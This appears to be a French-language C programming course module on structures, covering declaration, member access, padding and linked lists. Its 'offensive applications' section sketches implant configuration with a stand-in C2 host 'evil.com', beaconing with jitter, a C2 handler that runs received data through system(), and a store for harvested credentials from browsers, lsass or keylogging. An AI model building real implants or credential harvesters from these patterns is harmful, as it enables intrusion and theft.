# Module 11 : Structures (struct)

## Objectifs d'apprentissage

A la fin de ce module, tu sauras :
- Définir et déclarer des structures
- Accéder aux membres avec `.` et `->`
- Utiliser des pointeurs vers structures
- Créer des structures imbriquées
- Allouer des structures dynamiquement
- Comprendre l'alignement et le padding
- Applications offensives : paquets réseau, implant config, C2 protocols

---

## 1. Introduction aux structures

### C'est quoi une structure ?

Une **structure** permet de regrouper des variables de types différents sous un seul nom. C'est comme créer ton propre type de donnée.

```c
// Sans structure : variables séparées
char nom[50];
int age;
float salaire;

// Avec structure : tout regroupé
struct Personne {
    char nom[50];
    int age;
    float salaire;
};
```

### Pourquoi les structures ?

1. **Organisation** - Regrouper des données liées
2. **Lisibilité** - Code plus clair et maintenable
3. **Passage de données** - Un seul paramètre au lieu de plusieurs
4. **Représentation** - Modéliser des concepts du monde réel
5. **Protocoles** - Définir des formats de paquets réseau

---

## 2. Déclaration de structures

### Syntaxe de base

```c
struct NomStructure {
    type1 membre1;
    type2 membre2;
    // ... autres membres
};
```

### Exemple concret

```c
struct Target {
    char ip[16];        // Adresse IP
    int port;           // Port
    int is_alive;       // État (0 ou 1)
    char hostname[64];  // Nom d'hôte
};
```

### Déclarer des variables

```c
// Méthode 1 : Séparément
struct Target t1;
struct Target t2;

// Méthode 2 : À la définition
struct Target {
    char ip[16];
    int port;
} target1, target2;

// Méthode 3 : Avec initialisation
struct Target t3 = {"192.168.1.1", 80, 1, "router"};
```

### typedef pour simplifier

```c
typedef struct {
    char ip[16];
    int port;
    int is_alive;
} Target;

// Maintenant on peut écrire :
Target t1;  // Au lieu de : struct Target t1;
```

---

## 3. Accès aux membres

### Opérateur point (.)

Pour accéder aux membres d'une structure normale :

```c
struct Target t;

// Écriture
strcpy(t.ip, "192.168.1.100");
t.port = 443;
t.is_alive = 1;

// Lecture
printf("IP: %s\n", t.ip);
printf("Port: %d\n", t.port);
```

### Opérateur flèche (->)

Pour accéder aux membres via un **pointeur** :

```c
struct Target t;
struct Target *ptr = &t;

// Avec flèche (via pointeur)
strcpy(ptr->ip, "10.0.0.1");
ptr->port = 22;

// Équivalent avec déréférencement + point
(*ptr).port = 22;  // Même effet, mais plus lourd
```

### Règle simple

```
Variable normale : utilisez .
Pointeur        : utilisez ->
```

### Schéma mémoire

```
struct Target t :
┌────────────────────────────────────────────┐
│ ip[16]      │ port │ is_alive │ hostname   │
│ "192.168.." │ 443  │ 1        │ "server"   │
└────────────────────────────────────────────┘
       ↑          ↑
    t.ip       t.port

struct Target *ptr = &t :
┌─────────┐     ┌─────────────────────────────┐
│ ptr     │────→│ ip, port, is_alive, hostname│
└─────────┘     └─────────────────────────────┘
                        ↑
                   ptr->port
```

---

## 4. Initialisation des structures

### Initialisation complète

```c
struct Target t1 = {"192.168.1.1", 80, 1, "webserver"};
```

### Initialisation par membre (C99+)

```c
struct Target t2 = {
    .ip = "10.0.0.1",
    .port = 22,
    .is_alive = 0,
    .hostname = "ssh_server"
};

// Ordre flexible
struct Target t3 = {
    .port = 443,
    .ip = "172.16.0.1"
    // Les autres membres sont initialisés à 0
};
```

### Initialisation à zéro

```c
struct Target t4 = {0};  // Tous les membres à 0
```

---

## 5. Structures et pointeurs

### Allocation dynamique

```c
#include <stdlib.h>

// Allouer une structure
struct Target *t = malloc(sizeof(struct Target));
if (t == NULL) {
    return -1;
}

// Utiliser via ->
strcpy(t->ip, "192.168.1.1");
t->port = 8080;

// Libérer
free(t);
t = NULL;
```

### Tableau de structures

```c
// Statique
struct Target targets[100];
targets[0].port = 80;

// Dynamique
struct Target *targets = malloc(100 * sizeof(struct Target));
targets[5].port = 443;
// ou : (targets + 5)->port = 443;

free(targets);
```

### Passage à une fonction

```c
// Par valeur (copie)
void print_target(struct Target t) {
    printf("%s:%d\n", t.ip, t.port);
}

// Par référence (pointeur) - PRÉFÉRÉ
void print_target_ref(struct Target *t) {
    printf("%s:%d\n", t->ip, t->port);
}

// Par référence constante (lecture seule)
void print_target_const(const struct Target *t) {
    printf("%s:%d\n", t->ip, t->port);
    // t->port = 80;  // ERREUR : const!
}
```

---

## 6. Structures imbriquées

### Structures dans des structures

```c
struct Address {
    char ip[16];
    int port;
};

struct Target {
    struct Address addr;    // Structure imbriquée
    char hostname[64];
    int is_alive;
};

// Utilisation
struct Target t;
strcpy(t.addr.ip, "192.168.1.1");
t.addr.port = 80;
strcpy(t.hostname, "server");
```

### Pointeur vers structure imbriquée

```c
struct Target *ptr = &t;

// Accès via pointeur
strcpy(ptr->addr.ip, "10.0.0.1");
ptr->addr.port = 22;
```

### Schéma

```
struct Target t :
┌─────────────────────────────────────────────┐
│ addr (struct Address)    │ hostname │ alive │
│ ┌──────────────────────┐ │          │       │
│ │ ip[16]     │ port    │ │          │       │
│ │ "192.168." │ 80      │ │ "server" │   1   │
│ └──────────────────────┘ │          │       │
└─────────────────────────────────────────────┘

Accès : t.addr.ip, t.addr.port
```

---

## 7. Taille et alignement des structures

### sizeof sur les structures

```c
struct Example {
    char c;     // 1 byte
    int i;      // 4 bytes
    char d;     // 1 byte
};

printf("Taille: %lu\n", sizeof(struct Example));
// Résultat : probablement 12, pas 6!
```

### Le padding (alignement)

Le compilateur ajoute des bytes de "padding" pour aligner les données :

```c
struct Example {
    char c;     // 1 byte
    // padding  // 3 bytes (pour aligner int sur 4)
    int i;      // 4 bytes
    char d;     // 1 byte
    // padding  // 3 bytes (pour que la taille soit multiple de 4)
};
// Total : 12 bytes
```

### Schéma du padding

```
Sans padding (théorique) :
┌───┬───────────────────┬───┐
│ c │        i          │ d │
└───┴───────────────────┴───┘
0   1                   5   6  = 6 bytes

Avec padding (réalité) :
┌───┬─────────┬───────────────────┬───┬─────────┐
│ c │ PADDING │        i          │ d │ PADDING │
└───┴─────────┴───────────────────┴───┴─────────┘
0   1         4                   8   9         12 = 12 bytes
```

### Optimiser la taille

Réordonner les membres pour réduire le padding :

```c
// Mauvais ordre : 12 bytes
struct Bad {
    char c;     // 1 + 3 padding
    int i;      // 4
    char d;     // 1 + 3 padding
};

// Bon ordre : 8 bytes
struct Good {
    int i;      // 4
    char c;     // 1
    char d;     // 1 + 2 padding
};
```

### Packing (supprimer le padding)

```c
// GCC
struct __attribute__((packed)) Packed {
    char c;
    int i;
    char d;
};  // Taille exacte : 6 bytes

// Attention : peut causer des problèmes de performance
// ou de compatibilité sur certaines architectures
```

---

## 8. Applications offensives

### 8.1 Structure de paquet réseau

```c
#include <stdint.h>

// En-tête TCP simplifié
struct __attribute__((packed)) TCPHeader {
    uint16_t src_port;      // Port source
    uint16_t dst_port;      // Port destination
    uint32_t seq_num;       // Numéro de séquence
    uint32_t ack_num;       // Numéro d'acquittement
    uint8_t  data_offset;   // Offset données + flags
    uint8_t  flags;         // Flags (SYN, ACK, etc.)
    uint16_t window;        // Taille fenêtre
    uint16_t checksum;      // Checksum
    uint16_t urgent_ptr;    // Pointeur urgent
};

// Flags TCP
#define TCP_FIN  0x01
#define TCP_SYN  0x02
#define TCP_RST  0x04
#define TCP_PSH  0x08
#define TCP_ACK  0x10
#define TCP_URG  0x20

void create_syn_packet(struct TCPHeader *tcp, uint16_t src, uint16_t dst) {
    tcp->src_port = htons(src);
    tcp->dst_port = htons(dst);
    tcp->seq_num = htonl(0x12345678);
    tcp->ack_num = 0;
    tcp->data_offset = 0x50;  // 5 * 4 = 20 bytes (pas d'options)
    tcp->flags = TCP_SYN;
    tcp->window = htons(65535);
    tcp->checksum = 0;
    tcp->urgent_ptr = 0;
}
```

### 8.2 Configuration d'implant

```c
typedef struct {
    char c2_server[64];     // Serveur C2
    int c2_port;            // Port C2
    int beacon_interval;    // Intervalle de callback (secondes)
    int jitter;             // Variation aléatoire (%)
    char user_agent[128];   // User-Agent HTTP
    int use_https;          // 1 = HTTPS, 0 = HTTP
    unsigned char xor_key;  // Clé pour encoder les communications
} ImplantConfig;

ImplantConfig config = {
    .c2_server = "evil.com",
    .c2_port = 443,
    .beacon_interval = 60,
    .jitter = 20,
    .user_agent = "Mozilla/5.0",
    .use_https = 1,
    .xor_key = 0x42
};

void beacon(ImplantConfig *cfg) {
    // Ajouter du jitter
    int actual_interval = cfg->beacon_interval;
    int jitter_amount = (cfg->beacon_interval * cfg->jitter) / 100;
    actual_interval += (rand() % (jitter_amount * 2)) - jitter_amount;

    printf("[*] Beaconing to %s:%d every %d seconds\n",
           cfg->c2_server, cfg->c2_port, actual_interval);
}
```

### 8.3 Structure de commande C2

```c
typedef struct {
    uint32_t cmd_id;        // ID de la commande
    uint32_t data_len;      // Longueur des données
    char command[32];       // Nom de la commande
    unsigned char data[];   // Données variables (flexible array member)
} C2Command;

typedef struct {
    uint32_t cmd_id;        // ID de la commande correspondante
    int status;             // Code de retour
    uint32_t data_len;      // Longueur de la réponse
    unsigned char data[];   // Données de réponse
} C2Response;

void handle_command(C2Command *cmd) {
    printf("[>] Command %u: %s (%u bytes)\n",
           cmd->cmd_id, cmd->command, cmd->data_len);

    if (strcmp(cmd->command, "shell") == 0) {
        // Exécuter commande shell
        system((char*)cmd->data);
    } else if (strcmp(cmd->command, "download") == 0) {
        // Télécharger un fichier
        printf("[*] Downloading: %s\n", cmd->data);
    } else if (strcmp(cmd->command, "upload") == 0) {
        // Upload un fichier
        printf("[*] Uploading...\n");
    }
}
```

### 8.4 Table de commandes avec handlers

```c
typedef void (*CmdHandler)(const char *arg);

typedef struct {
    char name[16];
    char description[64];
    CmdHandler handler;
} Command;

void cmd_whoami(const char *arg) {
    system("whoami");
}

void cmd_pwd(const char *arg) {
    system("pwd");
}

void cmd_exec(const char *arg) {
    system(arg);
}

void cmd_exit(const char *arg) {
    printf("Bye!\n");
    exit(0);
}

Command commands[] = {
    {"whoami", "Get current user", cmd_whoami},
    {"pwd", "Print working directory", cmd_pwd},
    {"exec", "Execute command", cmd_exec},
    {"exit", "Exit implant", cmd_exit},
    {"", "", NULL}  // Sentinelle
};

void dispatch(const char *name, const char *arg) {
    for (int i = 0; commands[i].handler != NULL; i++) {
        if (strcmp(commands[i].name, name) == 0) {
            commands[i].handler(arg);
            return;
        }
    }
    printf("Unknown command: %s\n", name);
}
```

### 8.5 Structure de credentials

```c
typedef struct {
    char username[64];
    char password[128];
    char domain[32];
    char hostname[64];
    time_t timestamp;
    int source;  // 0=browser, 1=lsass, 2=keylog
} Credential;

typedef struct {
    Credential *creds;
    int count;
    int capacity;
} CredentialStore;

int store_add(CredentialStore *store, Credential *cred) {
    if (store->count >= store->capacity) {
        int new_cap = store->capacity * 2;
        Credential *new_creds = realloc(store->creds,
                                         new_cap * sizeof(Credential));
        if (!new_creds) return -1;
        store->creds = new_creds;
        store->capacity = new_cap;
    }

    store->creds[store->count++] = *cred;
    return 0;
}

void store_dump(CredentialStore *store) {
    printf("=== Harvested Credentials (%d) ===\n", store->count);
    for (int i = 0; i < store->count; i++) {
        Credential *c = &store->creds[i];
        printf("[%d] %s\\%s : %s (from: %d)\n",
               i, c->domain, c->username, c->password, c->source);
    }
}
```

---

## 9. Structures et listes chaînées

### Concept

Une liste chaînée utilise des structures qui pointent vers d'autres structures du même type.

```c
struct Node {
    int data;
    struct Node *next;  // Pointeur vers le prochain noeud
};
```

### Exemple : liste de targets

```c
typedef struct TargetNode {
    char ip[16];
    int port;
    int alive;
    struct TargetNode *next;
} TargetNode;

TargetNode *create_node(const char *ip, int port) {
    TargetNode *node = malloc(sizeof(TargetNode));
    if (!node) return NULL;

    strncpy(node->ip, ip, 15);
    node->ip[15] = '\0';
    node->port = port;
    node->alive = 0;
    node->next = NULL;

    return node;
}

void add_target(TargetNode **head, const char *ip, int port) {
    TargetNode *new_node = create_node(ip, port);
    if (!new_node) return;

    new_node->next = *head;
    *head = new_node;
}

void print_targets(TargetNode *head) {
    TargetNode *current = head;
    int i = 0;
    while (current != NULL) {
        printf("[%d] %s:%d (alive: %d)\n",
               i++, current->ip, current->port, current->alive);
        current = current->next;
    }
}

void free_targets(TargetNode *head) {
    TargetNode *current = head;
    while (current != NULL) {
        TargetNode *next = current->next;
        free(current);
        current = next;
    }
}
```

---

## 10. Bonnes pratiques

### Toujours utiliser typedef

```c
// Définition
typedef struct {
    // membres
} MonType;

// Utilisation simplifiée
MonType var;
```

### Initialiser les structures

```c
// À zéro
struct Target t = {0};

// Ou explicitement
memset(&t, 0, sizeof(t));
```

### Valider les pointeurs

```c
void process(struct Target *t) {
    if (t == NULL) {
        return;
    }
    // traitement...
}
```

### Utiliser const quand approprié

```c
void print(const struct Target *t) {
    // Ne peut pas modifier t
}
```

### Documenter les structures

```c
typedef struct {
    char ip[16];        // Adresse IP (format string)
    int port;           // Port (1-65535)
    int is_alive;       // 0=down, 1=up
    time_t last_check;  // Timestamp dernier check
} Target;
```

---

## 11. Récapitulatif

| Concept | Syntaxe | Description |
|---------|---------|-------------|
| Définition | `struct S { ... };` | Créer un type structure |
| typedef | `typedef struct { ... } S;` | Créer un alias |
| Membre (variable) | `s.membre` | Accès via variable |
| Membre (pointeur) | `ptr->membre` | Accès via pointeur |
| Sizeof | `sizeof(struct S)` | Taille totale (avec padding) |
| Allocation | `malloc(sizeof(S))` | Allouer dynamiquement |
| Packed | `__attribute__((packed))` | Sans padding (GCC) |

---

## 12. Exercices

Voir [exercice.md](exercice.md) pour les exercices pratiques.

## 13. Prochaine étape

Le module suivant abordera les **unions et énumérations** :
- Union : plusieurs types partageant la même mémoire
- Enum : constantes nommées
- Applications : parsers de protocoles, type punning
